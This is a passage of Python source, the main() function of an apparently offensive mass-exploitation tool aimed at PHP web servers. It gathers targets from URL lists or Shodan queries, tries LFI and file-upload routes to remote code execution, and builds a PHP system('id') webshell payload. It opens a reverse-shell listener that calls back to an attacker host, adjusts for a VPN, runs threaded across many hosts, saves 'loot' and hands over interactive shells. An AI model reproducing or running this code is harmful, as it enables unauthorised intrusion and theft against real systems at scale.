    ap.add_argument("--auth", default="")
    ap.add_argument("--proxy", default="")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--delay", default="0.05-0.25")
    ap.add_argument("--retries", type=int, default=1)
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--cmd", default="id; uname -a")
    ap.add_argument("--loot", default="loot")
    ap.add_argument("--config-upload", action="store_true")
    ap.add_argument("--no-upload", action="store_true")
    ap.add_argument("--no-lfi", action="store_true")
    ap.add_argument("--rce-only", action="store_true")
    ap.add_argument("--wrap", action="store_true")
    ap.add_argument("--plan", action="store_true")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--resume", default="")
    ap.add_argument("--strict-ssl", action="store_true")
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    COLOR = sys.stdout.isatty() and not args.no_color and not os.environ.get("NO_COLOR")
    QUIET = args.quiet or (args.json and not sys.stdin.isatty())

    if args.self_test:
        return self_test()
    if args.wrap:
        print(build_chain("<?php echo 'PHPOMNI';system('id');?>"))
        return 0

    if sys.stdin.isatty() and (args.wizard or
                               (not args.urls and not args.file and not args.shodan)):
        args = wizard(args) or args
        if not args.urls:
            return 0

    if args.pwn:
        args.config_upload = True
        args.lport = 0 if args.lport == 4444 else args.lport
        if args.transport == "auto" and (detect_mullvad() or mullvad_by_ip()):
            args.transport = "http"
        if not args.lhost and args.transport != "http":
            args.lhost = auto_lhost()

    targets = list(args.urls)
    if args.file:
        with open(args.file, encoding="utf-8") as fh:
            targets += [norm_url(x) for x in fh if x.strip() and not x.startswith("#")]
    if args.shodan:
        if not args.shodan_key:
            bad("shodan needs --shodan-key or SHODAN_API_KEY")
            return 2
        targets += shodan_targets(args.shodan, args.shodan_key, args.limit)
    if not targets:
        ap.print_help()
        return 2

    if args.resume and os.path.isfile(args.resume):
        with open(args.resume, encoding="utf-8") as fh:
            done = {ln.strip() for ln in fh}
        targets = [x for x in targets if x not in done]

    if not args.json and not args.no_banner:
        say(_c(BANNER, "36"))

    if args.loot:
        LOOT = args.loot
        try:
            os.makedirs(LOOT, exist_ok=True)
        except OSError:
            LOOT = ""

    words = load_words(args.wordlist)
    listener = None
    if args.transport != "http" and args.lhost and not args.no_listener:
        listener = ShellListener(args.lport)
        if listener.ok:
            args.lport = listener.port
            ok(f"listener on {listener.port} (call back to {args.lhost})")
        else:
            warn("listener bind failed, using HTTP shell")
            args.transport = "http"
    elif args.transport == "http":
        inf("HTTP shell mode - no listener needed")

    live = Live(dash_render(), refresh_per_second=4, console=CON) \
        if (RICH and not args.plain and not args.json and not args.quiet) else None
    if live:
        live.start()
        threading.Thread(target=lambda: [time.sleep(0.4) or live.update(dash_render())
                                         for _ in iter(int, 1)], daemon=True).start()

    results: list[Target] = []
    try:
        if len(targets) == 1:
            results.append(run_target(build_target(targets[0], args), args, words, listener))
        else:
            inf(f"{len(targets)} targets, {args.threads} threads")
            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                futs = [pool.submit(run_target, build_target(u, args), args, words, listener)
                        for u in targets]
                for fu in as_completed(futs):
                    try:
                        results.append(fu.result())
                    except Exception:
                        if args.debug:
                            traceback.print_exc()
    except KeyboardInterrupt:
        say("\ninterrupted")
    finally:
        if live:
            live.stop()

    if args.quiet and not args.json:
        QUIET = False
    for t in results:
        report(t, args.json)
    if args.resume:
        with open(args.resume, "a", encoding="utf-8") as fh:
            fh.writelines(t.url("/") + "\n" for t in results)

    pwned = [t for t in results if t.shell_url]
    say("")
    if not pwned:
        warn(f"0/{len(results)} shells ({time.time() - START:.0f}s)")
        for t in results:
            say(f"  {t.host_header()}: {meaning(t)}")
    else:
        ok(f"{len(pwned)}/{len(results)} shells ({time.time() - START:.0f}s)")
        sender = None
        if listener and listener.shells:
            sender = listener
        elif args.transport == "auto":
            time.sleep(3)
            if listener and listener.shells:
                sender = listener
        if sender is None:
            inf("no callback received - using HTTP shell")
            sender = HttpShell(pwned[0], pwned[0].shell_url)
        if sys.stdin.isatty():
            shell_menu(sender, results)

    if listener:
        listener.stop()
    return 0 if pwned else 1


if __name__ == "__main__":
    sys.exit(main())
